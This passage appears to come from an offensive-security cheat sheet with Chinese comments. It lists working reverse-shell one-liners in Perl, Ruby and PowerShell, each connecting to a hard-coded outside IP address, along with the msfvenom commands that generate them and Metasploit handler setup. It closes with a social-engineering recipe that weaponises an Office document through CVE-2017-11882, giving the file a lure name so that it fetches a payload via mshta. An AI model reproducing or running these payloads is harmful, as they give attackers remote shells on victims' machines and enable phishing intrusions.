perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.33.6.150:9999");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
# cat shells.pl
perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"192.33.6.150:9999",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'
# windows cmd perl后门
msfvenom -p cmd/windows/reverse_perl LHOST=xxx LPORT=xxx -f raw -o shell.pl
# cat shell.pl
perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.33.6.150:9999");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
```
+ ruby
```
# unix cmd ruby后门
msfvenom -p cmd/unix/reverse_ruby LHOST=xxx LPORT=xxx -f raw -o shell.rb
msfvenom -p cmd/unix/reverse_ruby_ssl LHOST=xxx LPORT=xxx -f raw -o shells.rb
# cat shell.rb
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.33.6.150","9999");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
# cat shells.rb
ruby -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("192.33.6.150","9999")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'
# windows cmd ruby后门
msfvenom -p cmd/windows/reverse_ruby LHOST=xxx LPORT=xxx -f raw -o shell.rb
# cat shell.rb
ruby -rsocket -e "c=TCPSocket.new("192.33.6.150","9999");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end"
```
+ powershell
```
# windows cmd powershell后门
msfvenom -p cmd/windows/reverse_powershell LHOST=xxx LPORT=xxx -f raw -o shell.ps
# cat shell.ps
powershell -w hidden -nop -c $a='192.33.6.150';$b=9999;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}
```
## MSF Listening
```
$ msfconsole
$ msf5 > use exploit/multi/handler
$ msf5 exploit(multi/handler) > show options
$ msf5 exploit(multi/handler) > set PAYLOAD <Payload value>
$ msf5 exploit(multi/handler) > show options
$ msf5 exploit(multi/handler) > set RHOST <RHOST value>
$ msf5 exploit(multi/handler) > set RPORT <RPORT value>
$ msf5 exploit(multi/handler) > set LHOST <LHOST value>
$ msf5 exploit(multi/handler) > set LPORT <LPORT value>
$ msf5 exploit(multi/handler) > show options
$ msf5 exploit(multi/handler) > exploit
```
# Social Engineering
## Office-CVE-2017-11882
```
python Command_CVE-2017-11882.py -c "mshta.exe http://192.33.6.150:8080/love" -o 女孩子都有那些不为人知的密码.doc
msf5 > use exploit/self/Office_CVE_2017_11882 
msf5 exploit(self/Office_CVE_2017_11882) > set SRVHOST 192.33.6.150
msf5 exploit(self/Office_CVE_2017_11882) > set URIPATH love
msf5 exploit(self/Office_CVE_2017_11882) > set payload windows/meterpreter/reverse_tcp
```